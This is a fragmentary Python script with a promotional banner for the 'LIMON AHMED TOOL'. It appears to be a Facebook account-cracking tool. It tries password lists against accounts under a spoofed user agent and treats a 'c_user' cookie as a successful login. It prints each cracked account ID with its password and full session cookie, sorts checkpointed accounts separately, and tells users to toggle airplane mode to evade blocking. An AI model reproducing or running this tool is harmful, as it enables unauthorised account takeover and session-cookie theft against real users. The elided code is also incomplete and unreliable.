...
\033[1;37m[-] AUTHOR    :\033[1;32m ARIF HOSEN LIMON
\033[1;37m[-] GITHUB    :\033[1;32m DIGITAL-XD
\033[1;37m[-] TEAM      :\033[1;32m AKKOY/SIGDO/TALHA/LIMON
\033[1;97m===============================================================
'\33[1;97mTurn on & off flight (airplane) mode before use   
\033[1;97m===============================================================

       \33[37;41m\t WELLCOME TO LIMON AHMED TOOL\33[0;m

\033[1;37m================== \33[32;45mLIMON\33[0;m ======================\n""")
loop = 0
oks = []
cps = []
...
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Windows'
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m(LIMON-OKðŸ”¥)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\r\r\33[1;30m(LIMON-CPðŸ¤•)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write('\r\r%s[ATS] [%s/%s]  OK:- %s  CP:- %s '%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
